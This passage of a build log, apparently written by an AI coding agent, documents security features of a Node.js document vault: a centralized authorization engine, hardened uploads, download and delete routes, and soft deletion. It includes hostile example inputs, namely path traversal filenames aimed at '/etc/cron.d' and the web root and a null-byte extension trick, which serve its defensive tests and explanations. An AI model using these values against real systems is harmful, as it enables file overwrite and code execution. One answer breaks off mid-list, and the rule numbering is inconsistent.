- Implemented the full centralized authorization decision engine `authorize(user, doc, action)` in `src/authz.js` in strict compliance with `RULES.md` without modifying any test in `tests/authz.test.js`.
- All 35 parametrized matrix test cases now pass (100% pass rate; 61 total tests passing across all test suites).
- Built custom `AuthorizationError` class explicitly configured with `status: 404` and `statusCode: 404`, strictly satisfying Rule 3 ("Unauthorized access returns 404, never 403").
- Built `deny(user, doc, action, reason)` helper that logs an immutable `ACCESS_DENIED` audit event via `src/audit.js` before throwing the 404 error, strictly satisfying Rule 7 ("Every state change and every denied attempt writes an audit event via src/audit.js").
- Implemented complete access tier evaluation:
  - **Ownership check:** Compares user and document owner ObjectIds, granting full access (`read`, `edit`, `delete`, `grant`) strictly to the owner.
  - **Viewer access:** Grants `read` and `edit` when a user possesses an explicit `edit` grant in the `permissions` collection; grants `read` only when possessing a `read` grant. Rejects `delete` and `grant` unconditionally for all non-owners (Rule 4).
  - **Admin restrictions:** Enforces that `admin` role has zero automatic access to document contents (Rule 4). Admins only access documents if they are the direct owner or possess an explicit grant.
  - **Account status validation:** Enforces that unauthenticated (`null`) or deactivated (`isActive: false`) users are immediately rejected.
  - **Action validation:** Rejects unsupported or arbitrary action strings with 404.
- Recorded architecture decisions ADR 015 and ADR 016 in `docs/DECISIONS.md`.

---

### 2. Which Files Were Created / Modified
| File | Status | Purpose |
|---|---|---|
| `src/authz.js` | Created | Centralized Policy Decision Point (PDP) implementing `authorize()`, `deny()`, and `AuthorizationError`. |
| `docs/DECISIONS.md` | Modified | Appended ADRs 015 (Centralized PDP) and 016 (Unified Denial Pattern with Inline Audit Emission). |
| `docs/BUILD_LOG.md` | Modified | Appended this technical build log entry. |

---

### 3. Why This Design
- **Centralized Policy Decision Point (PDP):** Scattered authorization checks throughout route handlers inevitably lead to authorization bypasses, inconsistent error codes, and forgotten audit events. Centralizing all access decisions in `src/authz.js` guarantees that every document operation passes through an identical, unified decision engine.
- **Strict Fail-Closed Architecture:** The function is structured with positive validation guards: if an action or condition is not explicitly recognized and validated as permitted, execution falls through to the `deny()` helper. Access is never granted by default.
- **Robust ObjectId Equality (`areIdsEqual`):** Document references in Mongoose can arrive as BSON ObjectIds, hexadecimal strings, or populated documents (`doc.ownerId._id`). The comparison helper handles all forms safely, preventing type mismatch bugs where two identical IDs fail equality checks.
- **Inline Denial Auditing:** Handling audit event creation inside `deny()` guarantees that no rejection path can ever bypass the audit log. The audit event captures the attempted action, user, document, and exact denial rationale before the 404 error is raised.

---

### 4. What Attacks This Design Prevents
1. **Insecure Direct Object Reference (IDOR) & Horizontal Access (CWE-639 / CWE-284):**
   - Attackers attempting to access, edit, or delete documents belonging to another user by guessing or enumerating IDs are intercepted by `authorize()` and rejected.
2. **Vertical Privilege Escalation via Viewer Capabilities (CWE-269):**
   - Malicious viewers who have been granted `edit` access cannot escalate privileges to delete the document or share/grant permissions to unauthorized parties, because non-owners are strictly blocked from `delete` and `grant`.
3. **Insider Threat & Administrative Snooping (CWE-285):**
   - By eliminating automatic administrative bypasses, system administrators cannot view confidential document contents unless the document owner explicitly grants them permission.
4. **Information Disclosure via Resource Existence Oracles (CWE-200 / CWE-209):**
   - All unauthorized attempts throw `AuthorizationError` with `status: 404` (never 403). Attackers cannot distinguish between an invalid document ID and an existing confidential document.
5. **Session Exploitation on Deactivated Users (CWE-287):**
   - Users whose accounts have been deactivated (`isActive: false`) are denied access even if they hold active session cookies or own the document.

---

### 5. Technical Interview Questions & Answers

#### Question 1: What is the architectural difference between a Policy Enforcement Point (PEP) and a Policy Decision Point (PDP) in access control systems, and how is `authorize()` structured here?
**Answer:**
In standard XACML and zero-trust authorization architectures:
1. **Policy Enforcement Point (PEP):** The component that intercepts the incoming user request, pauses execution, queries the decision engine, and enforces the outcome (either continuing request processing or terminating with an HTTP error). In TrustVault, Express route handlers and middleware act as PEPs.
2. **Policy Decision Point (PDP):** The centralized component that evaluates user attributes, resource metadata, requested actions, and environment policies to make an authoritative permit/deny decision. In TrustVault, `src/authz.js` (`authorize()`) is the PDP.
3. **Architectural Benefit:** Decoupling the PDP from the PEP ensures that business logic (HTTP parameters, response formatting) is completely separate from authorization policy. The PDP can be independently tested, unit-verified against an exhaustive matrix, audited for compliance, and updated without touching route handlers.

#### Question 2: Why must an authorization engine enforce "Fail-Closed" (Default Deny) semantics, and how does the implementation of `authorize()` guarantee that no path accidentally permits access?
**Answer:**
1. **The Fail-Open Danger:** In "fail-open" designs, authorization functions check for disqualifying conditions (e.g. `if (user.isBanned) return deny()`) and default to granting access at the end of the function if no rule triggered. If a developer forgets an edge case (e.g. an unhandled action string or a null user), the function inadvertently returns `true`, granting unauthorized access.
2. **Fail-Closed Implementation:** In a "fail-closed" (default deny) design, access is assumed forbidden until proven permitted:
   - Input validations immediately reject unsupported actions, missing documents, unauthenticated actors, and inactive accounts via `deny()`.
   - Access is granted *only* when positive criteria are explicitly verified:
     - The user is confirmed to be the owner for supported actions (`return true`).
     - The user has an explicit database permission matching the required action level (`return true`).
   - Any execution reaching the end of the function calls `deny('Unauthorized permission level')`. There is zero probability of accidental permissive fallthrough.

#### Question 3: How does combining database-level permission lookups (`Permission.findOne`) with ownership checks in `authorize()` prevent race conditions and privilege escalation during concurrent permission updates?
**Answer:**
1. **Atomicity and Freshness:** By querying the normalized `Permission` collection at the moment of authorization, `authorize()` always inspects the absolute latest state committed to MongoDB. If an owner revokes a user's permission, the very next request from that user queries `Permission.findOne`, finds `null`, and is immediately rejected with 404.
2. **Separation from Stale Session Claims:** If permissions were stored inside user session cookies or JWT claims, a permission revocation would not take effect until the session expired or the JWT was reissued, leaving a dangerous window for unauthorized access.
3. **Compound Index Optimization:** The query `Permission.findOne({ documentId: doc._id, userId: user._id })` leverages the unique compound index `{ documentId: 1, userId: 1 }`, guaranteeing $O(\log N)$ B-tree lookup time with zero table-scan latency and preventing duplicate permission grants.

---

## Build Entry: Document Upload Security - 5 Bad Upload Rejections, Multer In-Memory Storage, Magic Byte Validation, UUID Storage & SHA-256 Digest
**Date:** 2026-10-24  
**Author:** Antigravity  

---

### 1. What Was Built
- **Comprehensive Upload Security Test Suite (`tests/upload.test.js`):**
  - Authored automated tests verifying rejection of the **5 bad upload scenarios**:
    1. **Wrong Type:** Non-whitelisted file type (e.g. bash scripts, executable binaries) rejected with HTTP 400 and `UPLOAD_FAILED` audit event logged.
    2. **Spoofed Extension:** Executable binaries disguised as benign files (e.g., Windows PE binary with `.pdf` extension) rejected with HTTP 400 via magic byte inspection and `UPLOAD_FAILED` audit event logged.
    3. **Oversized File:** Payloads exceeding the configured 5MB size ceiling rejected with HTTP 400/413 and `UPLOAD_FAILED` audit event logged.
    4. **Path Traversal Filename (`../`):** Filenames containing relative directory traversal sequences (e.g., `../../../../etc/cron.d/evil.pdf`) rejected with HTTP 400 and `UPLOAD_FAILED` audit event logged.
    5. **Empty File:** Zero-byte files rejected with HTTP 400 and `UPLOAD_FAILED` audit event logged.
  - Implemented and verified the **Happy Path**:
    - Valid PDF upload authenticated via session cookie.
    - Decoupled physical disk storage using cryptographically random UUID v4 filenames outside the web root (`storage/documents/`).
    - Cryptographic integrity recorded with a SHA-256 hex digest persisted on the `Document` model.
    - Verified physical file on disk matches upload byte-for-byte with matching SHA-256 checksum.
    - Validated emission of a `DOCUMENT_CREATE` audit event with status `SUCCESS`.
  - Verified unauthenticated upload attempts return HTTP 401 Unauthorized.
- **Upload Endpoint (`src/routes/documents.js`):**
  - Configured `multer` with `multer.memoryStorage()`, `preservePath: true`, and strict limits (5MB maximum size, 1 file per request).
  - Synchronous magic byte inspection via `file-type` (`FileType.fromBuffer`) evaluating in-memory buffers prior to any disk I/O.
  - Cross-validation against explicit MIME type whitelist (`application/pdf`, `image/jpeg`, `image/png`, `image/webp`) and extension matching.
  - Path traversal detection scanning for `..`, `/`, and `\` sequences.
  - Secure physical file writing via `fs.promises.writeFile` using `crypto.randomUUID()`.
  - Cryptographic digest computation via `crypto.createHash('sha256')`.
  - Automatic audit event logging for both denials and successful uploads via `logAuditEvent`.
- **Database Model Enhancements:**
  - Added `sha256` required string field to `src/models/Document.js` with regex validation (`/^[a-f0-9]{64}$/i`).
  - Updated `tests/models.test.js` to assert `sha256` validation.
  - Mounted document routes at `/documents` and `/api/documents` in `src/app.js`.

---

### 2. Which Files Were Created / Modified
| File | Status | Purpose |
|---|---|---|
| `tests/upload.test.js` | Created | Comprehensive integration tests for the 5 bad uploads, happy path, UUID disk storage, SHA-256 verification, and audit event logging. |
| `src/routes/documents.js` | Created | Upload controller implementing Multer memory storage, magic byte inspection, path traversal rejection, UUID storage, SHA-256 recording, and audit logging. |
| `src/models/Document.js` | Modified | Added required `sha256` hex string field with validation and updated documentation. |
| `src/app.js` | Modified | Mounted `documentRoutes` at `/documents` and `/api/documents`. |
| `tests/models.test.js` | Modified | Updated Document model validation tests to include the `sha256` property. |
| `package.json` | Modified | Added `multer` and `file-type` (v16.5.4 CommonJS) dependencies. |
| `.gitignore` | Modified | Added `storage/` and `uploads/` directories to prevent test files from polluting git repository. |
| `docs/DECISIONS.md` | Modified | Appended ADRs 017 (Magic Byte Validation), 018 (Path Traversal Sanitization), and 019 (UUID Storage & SHA-256). |
| `docs/BUILD_LOG.md` | Modified | Appended this technical build log entry. |

---

### 3. Why This Design
- **In-Memory Magic Byte Validation Before Disk Touch:**
  - Conventional file upload implementations write files directly to disk (using `multer.diskStorage()`) and only validate afterwards. This creates a critical vulnerability window: malicious files reside on the filesystem where they can be executed by web servers, trigger file-watcher vulnerabilities, or leave lingering unlinked files on crash.
  - By using `multer.memoryStorage()`, the binary payload is buffered in RAM. `file-type` inspects the initial header bytes (e.g. `%PDF-` for PDFs, `\xFF\xD8\xFF` for JPEGs, `\x89PNG` for PNGs). If the magic bytes do not match the whitelist, the buffer is dropped immediately without writing a single byte to disk.
- **Two-Tier Extension Spoofing Detection:**
  - Attackers frequently rename executable files (e.g., `malware.exe` to `malware.pdf`) or craft polyglot files that fool naive parsers. Checking both the detected magic byte MIME type and comparing it to the file extension guarantees that even if a payload contains valid image headers, it cannot be submitted with an incongruent extension.
- **Path Traversal Defense via `preservePath: true`:**
  - Standard multipart parsers often automatically strip path separators, which can mask traversal attacks from application-level logging and auditing. By setting `preservePath: true`, raw paths like `../../../../etc/cron.d/evil.pdf` are preserved and exposed to the validation layer, enabling TrustVault to reject the attack and record an audit log event containing the exact attempted traversal path.
- **Cryptographic UUID File Decoupling:**
  - Per Rule 7 (*"Files are stored outside web root under a random UUID name"*), files are stored in `storage/documents/<uuid>` with no file extension. The original filename is stored strictly as a metadata field in MongoDB. This completely eliminates filename collision overwrites, disables direct web server script execution, and prevents directory traversal attacks from ever resolving to physical disk paths.
- **Cryptographic SHA-256 Recording:**
  - Calculating `crypto.createHash('sha256').update(buffer).digest('hex')` at the moment of upload provides an immutable cryptographic fingerprint. This enables data integrity verification, rapid deduplication detection, and forensic non-repudiation in compliance with enterprise audit standards.
- **Mandatory Audit Logging:**
  - Per Rule 6 (*"Every state change and denied attempt writes an audit event via src/audit.js"*), every upload failure (wrong type, spoofed extension, oversized, path traversal, empty file) emits an `UPLOAD_FAILED` event with status `'DENIED'`, capturing user ID, client IP, User-Agent, and detailed reason. Successful uploads emit `DOCUMENT_CREATE` with status `'SUCCESS'`.

---

### 4. What Attacks This Design Prevents
1. **Unrestricted File Upload & Remote Code Execution (CWE-434 / CWE-94):**
   - Attackers uploading web shells (`.php`, `.jsp`, `.asp`), Node.js scripts, or compiled binaries cannot execute them because:
     - The file type whitelist only allows static document/image MIME types.
     - Files are stored outside the web root (`storage/documents/`), preventing web server URL routing from serving or executing them.
     - Files are saved as extensionless UUIDs, preventing file-extension-based script execution engines from parsing them.
2. **MIME-Type Spoofing and Polyglot Attacks (CWE-434 / CWE-20):**
   - Web clients can trivially falsify the `Content-Type` header (e.g. sending `Content-Type: application/pdf` for an executable). Inspecting the file's binary magic bytes directly in RAM ensures the file's true content matches its declared type.
3. **Path Traversal & Arbitrary File Overwrite (CWE-22 / CWE-59):**
   - An attacker attempting to place a file into system directories (such as `../../../../etc/cron.d/backdoor`) is blocked: the filename is scanned for traversal sequences (`..`, `/`, `\`), and the physical file is written using `crypto.randomUUID()`, completely ignoring user-provided paths.
4. **Denial of Service via File Size Flooding (CWE-400):**
   - Oversized uploads can exhaust server memory or disk storage. Multer's strict `limits: { fileSize: 5 * 1024 * 1024 }` intercepts payloads exceeding 5MB at the stream level, aborting the transfer and returning HTTP 400.
5. **Zero-Byte File Storage Pollution (CWE-20):**
   - Empty files waste database entries and storage pointers. Checking `req.file.size === 0` rejects empty uploads before database records or disk files are created.
6. **Data Tampering & Integrity Degradation (CWE-353):**
   - Recording the SHA-256 digest provides a cryptographic baseline. Any subsequent modification, disk corruption, or unauthorized alteration of the stored file can be detected immediately by recalculating the hash.

---

### 5. Technical Interview Questions & Answers

#### Question 1: Why is validating the HTTP `Content-Type` header or file extension insufficient for securing file uploads, and how does magic byte validation solve this vulnerability?
**Answer:**
1. **The Inherent Untrustworthiness of Client Metadata:**
   - The `Content-Type` HTTP header is supplied entirely by the client (browser or HTTP tool). An attacker using tools like cURL, Burp Suite, or Postman can effortlessly attach an executable file (`backdoor.exe` or `shell.php`) while setting `Content-Type: application/pdf`.
   - File extensions are purely arbitrary naming conventions. Renaming `evil.exe` to `statement.pdf` allows it to bypass superficial string or regex checks like `filename.endsWith('.pdf')`.
2. **Magic Byte Validation Mechanism:**
   - Most standardized file formats contain fixed binary signatures—known as "magic bytes" or magic numbers—in the first few bytes of the file header (e.g., `%PDF-` (`0x25 0x50 0x44 0x46`) for PDF, `\xFF\xD8\xFF` for JPEG, `\x89PNG\r\n\x1a\n` for PNG).
   - Libraries like `file-type` inspect the binary buffer directly, comparing byte offsets against known specifications. If an executable binary (`MZ` header: `0x4D 0x5A`) is sent with a `.pdf` extension, magic byte validation detects `application/x-msdownload`, exposing the spoof attempt and rejecting the upload.
3. **Defense-in-Depth Implementation:**
   - Robust security requires a two-tier check: verify that the magic bytes match an allowed MIME whitelist, and ensure that the file extension matches the detected MIME type. This prevents polyglots and extension-spoofing attacks from reaching backend storage.

#### Question 2: What are the security risks associated with storing uploaded files using their user-supplied original filenames, and how does storing files under random UUIDs outside the web root mitigate them?
**Answer:**
1. **Risks of User-Supplied Filenames:**
   - **Path Traversal (CWE-22):** If the application uses the original filename in disk paths (`path.join(uploadDir, req.file.originalname)`), filenames like `../../../../var/www/shell.js` can escape the intended directory and overwrite critical application files.
   - **File Collision & Overwrite:** If two users upload files with the name `invoice.pdf`, one user's file will overwrite the other's, resulting in data loss or unauthorized document replacement.
   - **Remote Code Execution (CWE-434):** If uploads are saved inside the web root (e.g. `public/uploads/`) with executable extensions (e.g. `.php`, `.phtml`, `.cgi`, `.js`), an attacker can request the file directly via `https://example.com/uploads/evil.php` and trigger server-side code execution.
   - **Null Byte Injection & Special Characters:** Filenames containing null bytes (`shell.php\0.pdf`), control characters, or Unicode normalization quirks can bypass extension filters in legacy C libraries or underlying OS filesystem drivers.
2. **UUID Storage Outside Web Root Solution:**
   - **Decoupled Identity:** Generating a cryptographically random UUID v4 (`crypto.randomUUID()`) guarantees that disk filenames consist strictly of alphanumeric characters and hyphens, completely eliminating path traversal and collision risks.
   - **Isolation from Static Handlers:** Storing files outside the web root (`storage/documents/`) ensures no web server (Nginx, Apache, Express `express.static`) will ever automatically serve or execute the file directly from a URL.
   - **Enforced Access Control:** The only way to retrieve a file is through an authenticated application route that consults the authorization engine (`authorize()`), verifying ownership and permissions before streaming bytes to the client.

#### Question 3: Why can buffering file uploads in memory (`multer.memoryStorage()`) be risky, and how do you achieve secure in-memory inspection without exposing the application to Denial of Service (DoS)?
**Answer:**
1. **The In-Memory Buffering Trade-off:**
   - **The Dilemma:** Writing files to disk before validation allows malicious files to touch the filesystem. However, buffering files in RAM (`memoryStorage`) consumes Node.js V8 heap memory.
   - **The DoS Vector (CWE-400):** If an attacker opens 100 concurrent HTTP requests each uploading a 500MB file, in-memory buffering without strict limits would allocate 50GB of RAM, quickly triggering Node.js Out-Of-Memory (OOM) crashes and taking down the entire service.
2. **Mitigating DoS While Retaining In-Memory Validation:**
   - **Strict Stream-Level Size Limits:** Multer allows setting `limits: { fileSize: 5 * 1024 * 1024, files: 1 }`. Busboy monitors the incoming multipart chunk stream; the moment the received bytes exceed 5MB, it halts buffering, destroys the incoming stream, and emits a `LIMIT_FILE_SIZE` error without consuming further memory.
   - **Heap Budgeting:** In a system with a 5MB per-file limit and a worker pool handling 20 concurrent uploads, maximum transient heap memory allocated for uploads is bounded at $\sim100\text{MB}$, which fits comfortably within standard Node.js heap allocations (default 2GB–4GB).
   - **Alternative for Large Files (Chunked Streaming):** For applications requiring large file uploads (e.g. 500MB video/dataset files), buffering the entire file in RAM is infeasible. Instead, stream the first 4KB to 8KB into memory to validate magic bytes using `file-type`, and once validated, pipe the remainder of the incoming stream directly to an isolated disk location or object store (e.g. AWS S3 / Google Cloud Storage) under a UUID.

---

## Build Entry: Document Lifecycle Management - List, Streamed Download, Edit Metadata, and Cascading Delete through `authorize()`
**Date:** 2026-10-24  
**Author:** Antigravity  

---

### 1. What Was Built
- **Comprehensive Integration Test Suite (`tests/documents.test.js` - 22 passing tests):**
  - **List (`GET /documents`):**
    - Verified document owners receive all documents they own.
    - Verified viewers receive strictly granted documents via database-level filtering (Rule 6), never observing unshared documents.
    - Verified administrators receive an empty list if they do not own documents and have not been granted explicit access (Rule 4).
    - Verified unauthenticated requests are rejected with HTTP 401.
  - **Download (`GET /documents/:id/download`):**
    - Verified streaming download through the application setting `Content-Disposition: attachment; filename="<originalName>"` and `Content-Type: <mimeType>`.
    - Verified streamed binary content integrity byte-for-byte against the stored SHA-256 cryptographic digest.
    - Verified successful download for document owners, viewers with granted `read` level, and viewers with granted `edit` level.
    - Verified unauthorized download attempts (unshared documents, administrators without grants, non-existent documents) return HTTP 404 (never 403 per Rule 3 & 4) and emit an `ACCESS_DENIED` audit event.
    - Verified emission of a `DOCUMENT_DOWNLOAD` audit event upon successful download.
  - **Edit Metadata (`PATCH /documents/:id` and `PUT /documents/:id`):**
    - Verified owners can update `title` and `description`.
    - Verified viewers with granted `edit` level can update `title` and `description`.
    - Verified viewers with granted `read` level cannot update metadata, returning HTTP 404 and emitting an `ACCESS_DENIED` audit event.
    - Verified administrators without ownership/grants cannot edit metadata, returning HTTP 404.
    - Verified immutable security fields (`fileStorageName`, `sha256`, `ownerId`) cannot be tampered with via metadata updates.
    - Verified emission of a `DOCUMENT_UPDATE` audit event capturing previous and new metadata.
  - **Delete (`DELETE /documents/:id`):**
    - Verified viewers (even those with granted `edit` level) cannot delete documents, returning HTTP 404 and emitting an `ACCESS_DENIED` audit event (Rule 4: delete is always denied to viewers).
    - Verified administrators without ownership cannot delete documents, returning HTTP 404.
    - Verified document owners can delete documents, triggering:
      - Physical disk removal of the storage file from `storage/documents/<uuid>`.
      - Cascading removal of all associated ACL permission records from the `Permission` collection.
      - Removal of the document record from MongoDB.
      - Emission of a `DOCUMENT_DELETE` audit event with status `SUCCESS`.
- **Encapsulated Document Service Layer (`src/services/documentService.js`):**
  - Encapsulated all Mongoose `Document` queries (`find`, `findById`, `create`, `deleteOne`) within the service layer.
  - Route handlers in `src/routes/documents.js` NEVER query the `Document` collection directly, fulfilling Rule 2 with 100% compliance.
  - Every single document retrieval and mutation method invokes `authorize(user, doc, action)` in `src/authz.js` before executing operations.
- **Document Route Controller (`src/routes/documents.js`):**
  - Implemented `GET /`, `GET /:id/download`, `PATCH /:id`, `PUT /:id`, and `DELETE /:id` delegating strictly to `documentService`.
  - Added robust `requireAuth` middleware verifying session state and populating `req.user`.

---

### 2. Which Files Were Created / Modified
| File | Status | Purpose |
|---|---|---|
| `tests/documents.test.js` | Created | Comprehensive integration test suite (22 tests) covering list, download, edit metadata, and delete authorization. |
| `src/services/documentService.js` | Created | Centralized service encapsulating all database queries on `Document`, enforcing `authorize()` on every document access (Rule 2). |
| `src/routes/documents.js` | Modified | Updated document routes to delegate all document operations to `documentService`, stream downloads with attachments, and enforce session authentication. |
| `docs/DECISIONS.md` | Modified | Appended ADRs 020 (Service Layer Chokepoint), 021 (Database-Level Permission Filtering), 022 (Streamed Downloads with Attachment), and 023 (Cascading Deletion). |
| `docs/BUILD_LOG.md` | Modified | Appended this technical build log entry. |

---

### 3. Why This Design
- **Elimination of Direct Route Queries (Rule 2):**
  - In traditional Express architectures, controllers often query models directly (`const doc = await Document.findById(id)`). When new routes are added or refactored, developers frequently forget to call the authorization function, resulting in critical Broken Object-Level Authorization (BOLA / IDOR) vulnerabilities.
  - By moving all `Document` queries into `src/services/documentService.js`, every retrieval function (`getDocumentById`, `getDownloadStream`, `updateDocumentMetadata`, `deleteDocument`, `listDocuments`) acts as an inescapable Policy Enforcement Point (PEP) that automatically invokes `authorize(user, doc, action)` in `src/authz.js`.
- **Database-Level Permission Filtering (Rule 6):**
  - Fetching all documents into memory and filtering with JavaScript array methods (`documents.filter(...)`) causes significant performance degradation as collections scale, introduces pagination and limit inaccuracies, and leaks document counts via response timing or memory footprint.
  - `listDocuments(user)` queries the `Permission` collection for granted document IDs and constructs a MongoDB `$or` query: `{ $or: [{ ownerId: user._id }, { _id: { $in: grantedDocIds } }] }`. The database utilizes indexed B-Tree evaluation to return strictly authorized documents over the network.
- **Streamed File Downloads with `Content-Disposition: attachment`:**
  - Direct file downloads can lead to Cross-Site Scripting (XSS) if user-uploaded files (such as SVGs containing `<script>` tags or HTML files disguised as documents) are rendered inline by the browser within the application's origin. Setting `Content-Disposition: attachment` forces browsers to treat the payload as an opaque file download rather than executing or rendering it in the DOM.
  - Streaming via `fs.createReadStream().pipe(res)` maintains an $O(1)$ constant memory footprint, preventing memory exhaustion when concurrent users download multi-megabyte documents.
- **Complete Cascading Resource Cleanup on Delete:**
  - Deleting a document without unlinking its physical disk storage wastes disk capacity and leaves sensitive data orphaned on the filesystem. Leaving stale permission records in MongoDB creates ACL inconsistencies. `deleteDocument()` coordinates physical disk file unlinking, permission record purge, and database record removal in an atomic, auditable sequence.

---

### 4. What Attacks This Design Prevents
1. **Broken Object-Level Authorization & Insecure Direct Object References (BOLA / IDOR - CWE-639 / CWE-284):**
   - Malicious users guessing or enumerating document IDs cannot view, download, modify, or delete documents belonging to other users. Every operation verifies ownership or explicit database permissions via `authorize()`.
2. **Information Disclosure via Resource Existence Oracles (CWE-200 / CWE-209):**
   - Per Rule 3 & 4, all unauthorized access attempts—whether targeting unshared documents, non-existent documents, or invalid actions—return HTTP 404 (never 403). Attackers cannot probe document IDs to discover confidential documents.
3. **Privilege Escalation by Viewers & System Administrators (CWE-269 / CWE-285):**
   - Viewers with `edit` permissions cannot delete documents or grant permissions to third parties (Rule 4). System administrators have no automatic bypass and cannot list or download document contents without explicit grants.
4. **Same-Origin Cross-Site Scripting via File Execution (CWE-79):**
   - Enforcing `Content-Disposition: attachment; filename="..."` ensures the browser downloads the file rather than executing scripts within the application's origin context.
5. **Denial of Service via Memory Exhaustion (CWE-400):**
   - Streaming file downloads directly from disk to the HTTP response pipe prevents allocating large file buffers in the Node.js V8 heap.
6. **Mass Assignment & Metadata Tampering (CWE-915):**
   - The metadata update route strictly filters input fields, permitting only `title` and `description` to be updated. Attackers cannot overwrite immutable security fields like `fileStorageName`, `sha256`, `sizeBytes`, or `ownerId`.
7. **Orphaned File Accumulation & ACL State Desynchronization (CWE-404):**
   - Synchronous cascading deletion guarantees that physical files and ACL permission entries are immediately destroyed when a document is deleted.

---

### 5. Technical Interview Questions & Answers

#### Question 1: Why is streaming files with `fs.createReadStream().pipe(res)` and `Content-Disposition: attachment` safer and more performant than using `fs.readFile()` or `Content-Disposition: inline`?
**Answer:**
1. **Performance and Memory Scalability:**
   - `fs.readFile()` reads the entire file into Node.js V8 heap memory before transmitting. If 50 concurrent users download a 10MB document, the server allocates 500MB of RAM. Under high concurrency, this triggers memory fragmentation, Garbage Collection pauses, and Out-Of-Memory (OOM) crashes.
   - `fs.createReadStream().pipe(res)` streams data in small chunks (default 64KB). The server memory footprint remains bounded at $\sim64\text{KB}$ per active download regardless of file size, providing true $O(1)$ space complexity and backpressure support.
2. **Security against Same-Origin Cross-Site Scripting (XSS):**
   - When files are served with `Content-Disposition: inline`, the browser attempts to render the file directly in the browser tab. If an attacker uploads a polyglot file, an SVG image with embedded `<script>` tags, or a disguised HTML document, the browser executes the script in the security origin of the web application, granting the attacker access to session tokens, local storage, and DOM state.
   - Setting `Content-Disposition: attachment; filename="<name>"` instructs user agents to treat the payload strictly as an external download, saving it to disk rather than interpreting or executing it within the application origin.

#### Question 2: In multi-tenant systems, why should search and document listing be permission-filtered at the database query layer rather than in JavaScript application memory after fetching?
**Answer:**
1. **Scalability and Network Efficiency:**
   - In-memory filtering requires querying all documents from MongoDB across the network into Node.js memory (`Document.find({})`) and running `documents.filter(...)`. In a production system with 1,000,000 documents, this exhausts network bandwidth, saturates the database connection, and crashes the Node.js process.
   - Database-level filtering (`Document.find({ $or: [{ ownerId: user._id }, { _id: { $in: grantedDocIds } }] })`) uses MongoDB's compound B-Tree indexes to retrieve only the authorized records, transmitting only relevant data over the wire.
2. **Pagination and Aggregation Integrity:**
   - In-memory filtering breaks database pagination (`limit` and `skip`). If an application requests page 1 with `limit: 20`, fetching 20 documents and filtering out 18 unauthorized documents returns only 2 documents to the user, breaking standard pagination contracts.
   - Filtering inside the database ensures that `limit` and `skip` apply directly to authorized results, maintaining accurate page sizes and total counts.
3. **Security and Timing Attack Prevention:**
   - Fetching unconstrained records into application memory risks accidental data leaks if an unhandled exception or serialization bug occurs. Furthermore, differences in response latency between filtering 10,000 records vs 1 record can leak the total volume of sensitive documents residing in the system.

#### Question 3: How does encapsulating database queries behind a dedicated service layer (with mandatory calls to `authorize()`) prevent IDOR vulnerabilities better than relying on controller-level checks?
**Answer:**
1. **The Vulnerability of Distributed Controller Checks:**
   - In codebases where route controllers directly invoke database models (`Document.findById(req.params.id)`), authorization enforcement relies entirely on the discipline of individual developers.
   - In fast-moving engineering teams, developers creating new endpoints (e.g. `GET /documents/:id/preview`, `POST /documents/:id/duplicate`) frequently forget to call the authorization helper, or implement inconsistent permission logic, directly creating Insecure Direct Object Reference (IDOR) vulnerabilities.
2. **Service Layer as an Inescapable Policy Enforcement Point (PEP):**
   - By encapsulating all model operations inside `documentService.js` and banning direct model queries in routes (Rule 2), no document can be fetched from the database without passing through `getDocumentById()`.
   - `getDocumentById()` systematically invokes `authorize(user, doc, action)` before returning the document instance. The authorization check is structurally coupled to the database query: it is physically impossible for a controller to retrieve a document without triggering the authorization policy.
3. **Consistency and Auditing:**
---

## Build Entry: Soft Deletion via `deletedAt` Tombstones, Universal 404 Access Denial, and Audit Reference Retention
**Date:** 2026-10-24  
**Author:** Antigravity  

---

### 1. What Was Built
- **Soft Deletion Mechanism (`src/services/documentService.js`):**
  - Updated `deleteDocument()` to set `doc.deletedAt = new Date()` and save the document record instead of executing `Document.deleteOne()` or unlinking the physical disk payload.
  - Preserved the MongoDB document record to maintain unbroken referential integrity with the `AuditEvent` collection, allowing `.populate('documentId')` to resolve the soft-deleted document's metadata.
- **Centralized Universal Access Rejection (`src/authz.js`):**
  - Added soft-deletion enforcement in `authorize(user, doc, action)`: any document with `deletedAt !== null` immediately calls `deny(user, doc, action, 'Document has been deleted')`.
  - Guarantees that soft-deleted documents return HTTP 404 (`Not Found`) for all actors—including document owners, viewers with granted permissions, and system administrators—on every route (`GET /:id`, `GET /:id/download`, `PATCH /:id`, `PUT /:id`, and repeated `DELETE /:id`).
- **Database-Level Search & List Exclusion (`src/services/documentService.js` & `src/routes/documents.js`):**
  - Enforced `{ deletedAt: null }` at the root of MongoDB query filters in `listDocuments()` and `searchDocuments()`, guaranteeing deleted documents never appear in user lists or search query results.
  - Implemented `GET /documents/search` and query parameter searching on `GET /documents` (`?search=...`, `?q=...`).
  - Added RESTful `GET /documents/:id` endpoint for individual document retrieval via `documentService.getDocumentById()`.
- **TDD Test-First Specification (`tests/documents.test.js`):**
  - Implemented comprehensive integration tests verifying soft deletion, audit referencing, universal 404 route denial, list/search exclusion, and policy checks before implementing code changes.
- **Architectural Documentation (`docs/DECISIONS.md`):**
  - Recorded ADR 024: Soft Deletion via Tombstone (`deletedAt`) with Audit Trail Preservation and Universal 404 Access Denial.

---

### 2. Which Files Were Created / Modified
| File | Status | Purpose |
|---|---|---|
| `tests/documents.test.js` | Modified | Authored test-first specifications verifying soft deletion, audit log referencing, 404 on all routes for everyone, and omission from list/search. |
| `src/authz.js` | Modified | Added soft-delete gate in `authorize()` rejecting any operation on a deleted document with 404 `AuthorizationError`. |
| `src/services/documentService.js` | Modified | Changed `deleteDocument()` to set `deletedAt` and save; added search filtering to `listDocuments()` with `{ deletedAt: null }`; exported `searchDocuments()`. |
| `src/routes/documents.js` | Modified | Added `GET /documents/:id` and `GET /documents/search` endpoints; passed `req.query` to `listDocuments()`. |
| `docs/DECISIONS.md` | Modified | Appended ADR 024. |
| `docs/BUILD_LOG.md` | Modified | Appended this technical build log entry. |

---

### 3. Why This Design
- **Audit Trail Integrity & Forensic Preservation:**
  - In compliance-regulated document vaults (e.g., SOC 2, HIPAA, ISO 27001), destroying database records breaks referential integrity. When audit logs reference a deleted file's `ObjectId`, hard deletion turns those foreign keys into dangling pointers (`null` on population). Soft-deleting retains the document entity with its immutable cryptographic SHA-256 digest, original filename, and ownership history for forensic accountability.
- **Universal 404 Access Denial (Information Disclosure Defense):**
